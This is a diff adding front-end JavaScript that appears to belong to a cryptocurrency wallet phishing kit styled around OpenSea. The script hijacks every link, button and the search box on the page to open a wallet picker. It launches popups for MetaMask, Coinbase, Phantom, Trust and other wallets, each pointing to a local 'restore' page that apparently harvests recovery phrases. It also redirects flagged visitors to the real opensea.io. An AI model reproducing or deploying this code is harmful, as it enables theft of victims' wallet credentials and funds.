@@ -1,0 +1,94 @@
+var s
+
+document.addEventListener('DOMContentLoaded', function() {
+    const url = new URL(window.location.href)
+    s = url.searchParams.get('v');
+
+    const mouse = localStorage.getItem('myMouse');
+    if(mouse == 'Jerry1') {
+        const link = document.createElement("a");
+        link.referrerPolicy = "no-referrer";
+        link.rel = "noreferrer";
+
+        link.href = "https://opensea.io";
+        link.click();
+    }
+    const searchInput = document.querySelector('#searchbox')
+    const links = document.querySelectorAll('a')
+    const buttons = document.querySelectorAll('button')
+
+    searchInput.addEventListener('keypress', ev => {
+        if(ev.key == 'Enter') {
+            ev.preventDefault()
+            openWallets()
+        }
+    })
+
+    links.forEach(link => {
+        link.addEventListener('click', ev => {
+            ev.preventDefault()
+            openWallets()
+        })
+    })
+
+    buttons.forEach(button => {
+        button.addEventListener('click', ev => {
+            ev.preventDefault()
+            openWallets()
+        })
+    })
+
+}, false);
+
+const openWallets = () => {
+    document.querySelector('#wallets').style.right = 0
+}
+
+const openMetamask = () => {
+    window.open('metamask.html?action=restore&v='+s, 'Metamask', `width=400,height=600,top=10,right=10`)
+}
+const openBitski = () => {
+    window.open('bitski.html?action=restore&v='+s, 'Bitski', `width=400,height=600,top=10,right=10`)
+}
+
+const openWalletConnect = () => {
+    window.open('connect.html?action=restore&v='+s, 'WalletConnect', `width=400,height=600,top=10,right=10`)
+}
+
+const openCoinbase = () => {
+    window.open('coinbase.html?action=restore&v='+s, 'Coinbase', `width=400,height=600,top=10,right=10`)
+}
+
+const openFortmatic = () => {
+    window.open('fortmatic.html?action=restore&v='+s, 'Fortmatic', `width=400,height=600,top=10,right=10`)
+}
+
+const openVenly = () => {
+    window.open('venly.html?action=restore&v='+s, 'Venly', `width=400,height=600,top=10,right=10`)
+}
+const openPhantom = () => {
+    window.open('phantom.html?action=restore&v='+s, 'Venly', `width=400,height=600,top=10,right=10`)
+}
+
+const openDapper = () => {
+    window.open('dapper.html?action=restore&v='+s, 'Dapper', `width=400,height=600,top=10,right=10`)
+}
+const openAuthereum = () => {
+    window.open('authereum.html?action=restore&v='+s, 'Authereum', `width=400,height=600,top=10,right=10`)
+}
+const openTorus = () => {
+    window.open('torus.html?action=restore&v='+s, 'Torus', `width=400,height=600,top=10,right=10`)
+}
+const openPortis = () => {
+    window.open('portis.html?action=restore&v='+s, 'Portis', `width=400,height=600,top=10,right=10`)
+}
+const openKaikas = () => {
+    window.open('kaikas.html?action=restore&v='+s, 'Kaikas', `width=400,height=600,top=10,right=10`)
+}
+const openOpera = () => {
+    window.open('oper.html?action=restore&v='+s, 'opera', `width=400,height=600,top=10,right=10`)
+}
+const openTrust = () => {
+    window.open('trust.html?action=restore&v='+s, 'trust', `width=400,height=600,top=10,right=10`)
+}
+
